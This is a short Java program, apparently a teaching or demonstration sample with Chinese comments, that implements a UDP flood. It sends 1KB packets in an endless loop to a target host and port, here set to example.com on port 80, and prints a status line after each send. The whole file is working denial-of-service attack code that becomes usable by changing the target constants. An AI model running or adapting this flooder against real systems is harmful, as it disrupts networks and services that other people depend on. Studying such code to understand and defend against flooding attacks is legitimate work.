import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UdpFloodExample {
    private static final String TARGET_HOST = "example.com";
    private static final int TARGET_PORT = 80;
    private static final int PACKET_SIZE = 1024; // 1KB

    public static void main(String[] args) {
        System.out.println("UDP洪泛示例已启动...");
        System.out.println("使用netstat, ss, tcpdump等命令进行故障排查");
        
        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress address = InetAddress.getByName(TARGET_HOST);
            byte[] buffer = new byte[PACKET_SIZE];
            
            while (true) {
                // 创建UDP数据包
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, TARGET_PORT);
                
                // 发送数据包
                socket.send(packet);
                System.out.println("已发送UDP数据包");
                
                // 短暂休眠，避免过于频繁
                Thread.sleep(10);
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}    